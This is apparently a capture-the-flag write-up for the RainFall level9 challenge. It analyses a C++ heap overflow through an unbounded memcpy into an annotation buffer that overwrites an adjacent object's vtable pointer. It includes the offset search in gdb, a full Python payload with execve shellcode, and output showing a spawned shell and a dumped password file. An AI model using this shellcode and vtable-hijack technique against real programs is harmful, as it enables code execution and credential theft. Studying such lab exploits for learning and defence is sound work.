# Source Code

<table  style="margin: 0 auto;">
  <tr>
    <th>Assembly Code</th>
    <th>C Code</th>
  </tr>
  <tr>
    <td>
<pre><code class="language-asm">

Dump of assembler code for function main:
   0x080485f4 <+0>:     push   ebp
   0x080485f5 <+1>:     mov    ebp,esp
   0x080485f7 <+3>:     push   ebx
   0x080485f8 <+4>:     and    esp,0xfffffff0
   0x080485fb <+7>:     sub    esp,0x20
   0x080485fe <+10>:    cmp    DWORD PTR [ebp+0x8],0x1
   0x08048602 <+14>:    jg     0x8048610 <main+28>
   0x08048604 <+16>:    mov    DWORD PTR [esp],0x1
   0x0804860b <+23>:    call   0x80484f0 <_exit@plt>
   0x08048610 <+28>:    mov    DWORD PTR [esp],0x6c
   0x08048617 <+35>:    call   0x8048530 <_Znwj@plt>
   0x0804861c <+40>:    mov    ebx,eax
   0x0804861e <+42>:    mov    DWORD PTR [esp+0x4],0x5
   0x08048626 <+50>:    mov    DWORD PTR [esp],ebx
   0x08048629 <+53>:    call   0x80486f6 <_ZN1NC2Ei>
   0x0804862e <+58>:    mov    DWORD PTR [esp+0x1c],ebx
   0x08048632 <+62>:    mov    DWORD PTR [esp],0x6c
   0x08048639 <+69>:    call   0x8048530 <_Znwj@plt>
   0x0804863e <+74>:    mov    ebx,eax
   0x08048640 <+76>:    mov    DWORD PTR [esp+0x4],0x6
   0x08048648 <+84>:    mov    DWORD PTR [esp],ebx
   0x0804864b <+87>:    call   0x80486f6 <_ZN1NC2Ei>
   0x08048650 <+92>:    mov    DWORD PTR [esp+0x18],ebx
   0x08048654 <+96>:    mov    eax,DWORD PTR [esp+0x1c]
   0x08048658 <+100>:   mov    DWORD PTR [esp+0x14],eax
   0x0804865c <+104>:   mov    eax,DWORD PTR [esp+0x18]
   0x08048660 <+108>:   mov    DWORD PTR [esp+0x10],eax
   0x08048664 <+112>:   mov    eax,DWORD PTR [ebp+0xc]
   0x08048667 <+115>:   add    eax,0x4
   0x0804866a <+118>:   mov    eax,DWORD PTR [eax]
   0x0804866c <+120>:   mov    DWORD PTR [esp+0x4],eax
   0x08048670 <+124>:   mov    eax,DWORD PTR [esp+0x14]
   0x08048674 <+128>:   mov    DWORD PTR [esp],eax
   0x08048677 <+131>:   call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:   mov    eax,DWORD PTR [esp+0x10]
   0x08048680 <+140>:   mov    eax,DWORD PTR [eax]
   0x08048682 <+142>:   mov    edx,DWORD PTR [eax]
   0x08048684 <+144>:   mov    eax,DWORD PTR [esp+0x14]
   0x08048688 <+148>:   mov    DWORD PTR [esp+0x4],eax
   0x0804868c <+152>:   mov    eax,DWORD PTR [esp+0x10]
   0x08048690 <+156>:   mov    DWORD PTR [esp],eax
   0x08048693 <+159>:   call   edx
   0x08048695 <+161>:   mov    ebx,DWORD PTR [ebp-0x4]
   0x08048698 <+164>:   leave
   0x08048699 <+165>:   ret
</code></pre>
</td>
<td>
<pre><code class="language-c">
class N {
public:
    virtual int operator+(const N &other) const {
        return this->value + other.value;
    }
    
    virtual int operator-(const N &other) const {
        return this->value - other.value;
    }
    
    void setAnnotation(char *s)
    {
      size_t len;
    
      len = strlen(s);
      return memcpy(annotation, s, len);
    }
    
    N(int val) : value(val) {}
    virtual ~N() {}

private:
    char annotation[100];
    int value;
};

int main(int argc, const char **argv) {
    if (argc <= 1) std::exit(1);
    
    N* obj1 = new N(5);
    N* obj2 = new N(6);
    
    obj1->setAnnotation(argv[1]);
    
    obj2 + obj1;
}
</code></pre>
</td>
</tr>
</table>


# Exploring


### 1. Vulnerability Overview

The class `N` provides a method:

```cpp
void setAnnotation(char *s)
{
  size_t len;
  len = strlen(s);
  return memcpy(annotation, s, len);
}
```

This function copies the contents of `s` into the fixed-size buffer `annotation` (100 bytes). **No bounds checking is performed.** Therefore, if an attacker supplies an input string longer than 100 bytes, the extra bytes will overflow the `annotation` array.


### 2. Heap Memory Layout (Before Exploitation)

Consider that the program creates two objects on the heap:

```cpp
N* obj1 = new N(5);
N* obj2 = new N(6);
```

On a typical x86 system, the layout for each object with virtual functions is:

```
+-------------------------------+
| vtable pointer (4 bytes)      | <-- Points to class N's virtual table
+-------------------------------+
| annotation[100 bytes]         |
+-------------------------------+
| value (4 bytes)               |
+-------------------------------+
```

The `N` class and its objects(`obj1`, `obj2`), has virtual table looks like:

```
+-------------------------------+
|   address of:  operator+      |
+-------------------------------+
|   address of:  operator-      |
+-------------------------------+
|   address of: ~N (destructor) |
+-------------------------------+
```


Since objects are allocated consecutively, the heap might look like this:

```
-------------------------------------------------
|             Object: obj1 (N)                  |
|-----------------------------------------------|
| [vtable ptr]       | 0x????????               |
|-----------------------------------------------|
| [annotation]       | "normal data..."         |
|      (100 bytes)   |                          |
|-----------------------------------------------|
| [value]            | 5                        |
-------------------------------------------------
|             Object: obj2 (N)                  |
|-----------------------------------------------|
| [vtable ptr]       | 0x????????               |
|-----------------------------------------------|
| [annotation]       | "normal data..."         |
|      (100 bytes)   |                          |
|-----------------------------------------------|
| [value]            | 6                        |
-------------------------------------------------
```


### 3. Strategie

#### **Step 3.1: Triggering the Overflow**

- We can supplies an argument (`argv[1]`) with a length greater than 100 bytes.
- When `obj1->setAnnotation(argv[1]);` is called, the `memcpy` copies the entire input into `annotation`.
- The first 100 bytes correctly fill `annotation`, but the following bytes will overflow into the next fields.

#### **Step 3.2: Overwriting Adjacent Memory**

Since `obj1` and `obj2` are allocated one after the other, the overflow from `obj1->annotation` can overwrite part (or all) of `obj2`'s memory. The most critical target is `obj2`’s **vtable pointer**.

Visualizing the overflow:

```
[ Heap Layout Before Overflow ]
-------------------------------------------------
|             Object: obj1 (N)                  |
|-----------------------------------------------|
| [vtable ptr]       | 0xV1 (valid pointer)     |
|-----------------------------------------------|
| [annotation]       | "A1[100 bytes]"          |
|-----------------------------------------------|
| [value]            | 5                        |
-------------------------------------------------
|             Object: obj2 (N)                  |
|-----------------------------------------------|
| [vtable ptr]       | 0xV2 (valid pointer)     |
|-----------------------------------------------|
| [annotation]       | "A2[100 bytes]"          |
|-----------------------------------------------|
| [value]            | 6                        |
-------------------------------------------------
```

After a long input is copied into `obj1->annotation`, the layout becomes:

```
[ Heap Layout After Overflow ]
-------------------------------------------------------
|             Object: obj1 (N)                        |
|-----------------------------------------------------|
| [vtable ptr]       | 0xV1 (unchanged)               |
|-----------------------------------------------------|
| [annotation]       | "A1[100 bytes]" + extra        |
|                    | bytes overwriting:             |
|                    | [obj1->value] and part of      |
|                    | obj2's memory                  |
|-----------------------------------------------------|
|             Object: obj2 (N)                        |
|-----------------------------------------------------|
| [vtable ptr]       | 0xATTACK (controlled pointer ) |
|-----------------------------------------------------|
| [annotation]       | "A2[100 bytes]"                |
|-----------------------------------------------------|
| [value]            | 6                              |
-------------------------------------------------------
```

- **Key point:** The extra bytes overflow from `obj1->annotation` into `obj2` and overwrite its vtable pointer (`0xV2`) with an controlled value (`0xATTACK`).

#### **Step 3.3: Hijacking Execution Flow**

Later in the code, the expression `obj2 + obj1;` is executed. Since `operator+` is declared as `virtual`, the call looks up the function address from `obj2`’s vtable pointer. With the vtable pointer now overwritten, the lookup will jump to an address specified by us.

- **Result:** The program ends up executing code at the controlled address, thus redirecting control of the execution flow.

---


# Exploiting


So our goal  override `obj2` vtable with controlled buffer address usually `annotation[100]` that itself contain address to a malicious function (don't exist on code) or to a shellcode located on `annotation + 4`.


Get the offset from `obj1->annotation` to `obj2->vtable`:

```
 ❯ python3 tools/cyclic.py -g 130
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2A


   0x08048677 <+131>:   call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:   mov    eax,DWORD PTR [esp+0x10]
   0x08048680 <+140>:   mov    eax,DWORD PTR [eax]
=> 0x08048682 <+142>:   mov    edx,DWORD PTR [eax]
   0x08048684 <+144>:   mov    eax,DWORD PTR [esp+0x14]
   0x08048688 <+148>:   mov    DWORD PTR [esp+0x4],eax
   0x0804868c <+152>:   mov    eax,DWORD PTR [esp+0x10]
   0x08048690 <+156>:   mov    DWORD PTR [esp],eax
   0x08048693 <+159>:   call   edx
   0x08048695 <+161>:   mov    ebx,DWORD PTR [ebp-0x4]
   0x08048698 <+164>:   leave
   0x08048699 <+165>:   ret
End of assembler dump.
gdb-peda$ p $eax
$1 = 0x41366441    <<<--- new value of overridden obj2 vtable


 ❯ python3 tools/cyclic.py -o 0x41366441
Offset found at: 108
```

The offset is **108**.


The payload python file looks like:

```
buffer_addr = '\x0c\xa0\x04\x08' # obj1->annotation address on heap
shellcode_addr = '\x10\xa0\x04\x08' # obj1->annotation + 4
nop = '\x90' * 5

shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'

padding_len = 108 - len(shellcode_addr) - len(nop) - len(shellcode)

padding = '\x90' * padding_len

payload = shellcode_addr + nop + shellcode + padding + buffer_addr

print payload,
```

The output:

```
level9@RainFall:~$ ./level9 `python2 payload.py`
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

The shellcode on payload was executed successfully, See you on the next challenge (`bonus0`).
